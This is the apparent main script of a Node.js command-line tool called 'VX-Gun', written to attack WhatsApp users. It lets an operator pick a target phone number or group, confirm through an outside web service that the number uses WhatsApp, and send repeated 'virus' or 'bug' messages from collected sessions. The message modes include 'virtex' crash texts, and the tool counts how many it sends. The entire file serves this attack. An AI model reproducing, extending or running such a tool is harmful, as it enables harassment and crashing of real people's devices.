const readline = require('readline');
const figlet = require('figlet');
const validatePhoneNumber = require('validate-phone-number-node-js');

const package = require("./package.json")

// app
const {
    addSession, checkSessionActive, WhatsAppExecute,
} = require("./app/WhatsApp");

// helpers
const {
    clear, closeApp,
} = require("./helpers/system");
const {
    color, bgcolor, bold,
} = require("./helpers/color");
const {
    simulateAsyncPause,
} = require("./helpers/promise");
const {
    fetchJson,
} = require("./helpers/fetch");
const { clearAllSession } = require('./helpers/fs');

/////////////////////////////////////////////////////////////////

function errorMessage(message) {
    console.log(color(message, "tomato"))
}
function successMessage(message) {
    console.log(color(message, "lime"))
}
function processMessage(message) {
    console.log(color(message, "aquamarine"));
}
function resultMessage(key, value) {
    console.log(color(key, "royalblue"), ":", color(value, "lime"));
}

/////////////////////////////////////////////////////////////////
// Define
let payload = 3;
let target = null;
let mode = 1;
/////////////////////////////////////////////////////////////////

const banner = async (first = false) => {
    return new Promise(async function (resolve, reject) {
        await figlet(package.name, async function (err, figlet_text) {
            if (err) {
                console.log('Something went wrong...');
                console.dir(err);
                return;
            }
            clear();
            console.log(bgcolor(color(bold(figlet_text), "lime"), "crimson"))
            console.log("Version : ", color(package.version, "aquamarine"))
            first ? console.log(`type ${color("help", "magenta")} to show all menu`) : ""
            console.log("")
            resolve()
        });
    })
}

function listMenu(array) {
    return "commands:\n" + array.map(text => {
        return "  " + text + "\n"
    }).join("")
}

function menu() {
    function example(text) {
        return `\n             ${color("ex", "lime")} : ${text}`
    }
    function variable(key, value) {
        return `\n             ${color(key, "lime")} : ${color(value, "aquamarine")}`
    }
    console.log(listMenu([
        "clear      clear all session files",
        //
        "check      check all session files that are still connected",
        //
        "target     set the target you want to attack"
        + example("target personal " + color("phone_number", "tomato"))
        + example("target group " + color("group_link", "tomato")),
        //
        "add        new whatsapp session file",
        //
        "payload    multiplication number of messages to be sent"
        + variable("default", 3),
        //
        "mode       change the virus message you want to send"
        + variable("default", 1)
        + example("mode " + color(1, "tomato") + ` (scan all from virtex directory #many)`)
        + example("mode " + color(2, "tomato") + ` (bug repeat #1)`)
        + example("mode " + color(3, "tomato") + ` (bug product #1)`),
        //
        "execute    genjieeahhhh!!",
        //
        "exit       goodbye...",
    ]))
}

function Main() {
    return new Promise(async function (resolve, reject) {
        await banner(true);
        let rl = readline.createInterface(process.stdin, process.stdout)
        rl.setPrompt(color("VX-Gun", "lime") + " " + color("~>", "red") + " " + color("", "lime"))
        rl.prompt();
        await rl.on('line', async function (command) {
            await banner();
            //
            if ([
                "exit",
            ].some(v => command === v)) { // close app
                rl.close()
                return // bail here, so rl.prompt() isn't called again
            }
            //
            if (command === "help" || command === '?') {
                menu();
            } else if (command === "clear") {
                await clearAllSession(list_delete => {
                    console.log(list_delete.map(v => {
                        return "- " + color(v, "lavender") + " " + color("[DELETE]", "tomato") + "\n"
                    }).join(""))
                })
            } else if (command === "check") {
                await checkSessionActive(async session => {
                    await banner();
                    if (session.total > 0) {
                        console.log(`ACTIVE : ${session.active.length}`, "\n" + session.active.map(v => {
                            return "- " + color(v, "lavender") + " " + color("[ACTIVE]", "lime")
                        }).join("\n") + "\n")
                        console.log(`EXPIRED : ${session.deleted.length}\n`, "\n" + session.deleted.map(v => {
                            return "- " + color(v, "red") + " " + color("[DELETED]", "tomato")
                        }).join("\n") + "\n")
                    } else {
                        successMessage("session is clear!")
                    }
                    simulateAsyncPause(3000);
                })
            } else if (String(command).startsWith("target")) {
                const split = command.split(" ");
                const type = split[1];
                if (split.length === 1) {
                    if (target !== null) {
                        console.log(`target : ${color(target, "magenta")}`)
                    } else {
                        errorMessage("please select target!")
                    }
                } else {
                    if (type === "personal") {
                        try {
                            const number = split[2].replace(/[^\d]/g, "")
                            const isPhoneNumber = validatePhoneNumber.validate(number);
                            if (isPhoneNumber) {
                                // check if phone number is registered
                                processMessage("checking the target number in the whatsapp database...");
                                const registered = (await fetchJson("https://jefripunza-bot.herokuapp.com/cek-nomor/" + number)).registered;
                                if (registered) {
                                    target = number
                                    console.log(`set target : ${color(target, "magenta")}`)
                                } else {
                                    errorMessage("this number is not registered as whatsapp!")
                                }
                            } else {
                                errorMessage("this is not mobile number format!")
                            }
                        } catch (error) {
                            errorMessage("please add the number of the target to be attacked!")
                        }
                    } else if (type === "group") {
                        if (split.length === 2) {
                            errorMessage("please add the group id of the target to be attacked!")
                        } else {
                            const group_id = split[2]
                            target = group_id
                            console.log(`target : ${color(group_id, "magenta")}`)
                        }
                    } else {
                        errorMessage(`target type ${color(type, "red")} not found!`)
                    }
                }
            } else if (command === "add") {
                const new_session = await addSession();
                await banner();
                successMessage(new_session + ".join is created!")
            } else if (String(command).startsWith("payload")) {
                const split = command.split(" ");
                if (split.length === 1) {
                    errorMessage("please input number of payload!")
                } else {
                    const number = split[1].replace(/[^\d]/g, "")
                    if (String(number).length > 0 && parseInt(number) !== 0) {
                        payload = parseInt(number)
                        console.log(`payload : ${color(payload, "magenta")}`)
                    } else {
                        errorMessage("please input number of payload!")
                    }
                }
            } else if (String(command).startsWith("mode")) {
                const split = command.split(" ");
                if (split.length === 1) {
                    errorMessage("please input number of mode!")
                } else {
                    const number = split[1].replace(/[^\d]/g, "")
                    if (String(number).length > 0 && parseInt(number) !== 0) {
                        mode = parseInt(number)
                        console.log(`mode : ${color(mode, "magenta")}`)
                    } else {
                        errorMessage("please input number of mode!")
                    }
                }
            } else if (command === "execute") {
                if (target !== null) {
                    console.log(`mode    : ${color(mode, "magenta")}`)
                    console.log(`target  : ${color(target, "magenta")}`)
                    console.log(`payload : ${color(payload, "magenta")}`)
                    await Execute()
                } else {
                    errorMessage("please set the target!")
                }
            } else {
                if (String(command).length > 0) {
                    errorMessage(`unknown command: "${command}"`)
                } else {
                    errorMessage(`please type command!`)
                }
                console.log(`\ntype ${color("help", "magenta")} to show all menu\n`)
            }
            await rl.prompt()
        }).on('close', function () {
            console.log(color("Bye", "lime"));
            resolve(color("Exit...", "red")) // this is the final result of the function
        });
    })
}

async function Run() {
    try {
        await closeApp(await Main()) // start & close
    } catch (e) {
        console.log('failed:', e)
    }
}
Run()

async function Execute() {
    return new Promise(async function (resolve, reject) {
        await setTimeout(async () => {
            console.log("3");
            await setTimeout(async () => {
                console.log("2");
                await setTimeout(async () => {
                    console.log("1");
                    await setTimeout(async () => {
                        // execute whatsapp
                        await WhatsAppExecute(target, payload, mode, async result => {
                            successMessage("Finish...", { result })
                            await simulateAsyncPause(2000)
                            await banner();
                            resultMessage("total virus terkirim", typeof result === "object" ? result.reduce((a, b) => a + b, 0) : result)
                            successMessage("Done...")
                            await simulateAsyncPause(2000)
                            resolve()
                        })
                    }, 1000)
                }, 1000)
            }, 1000)
        }, 1000)
    })
}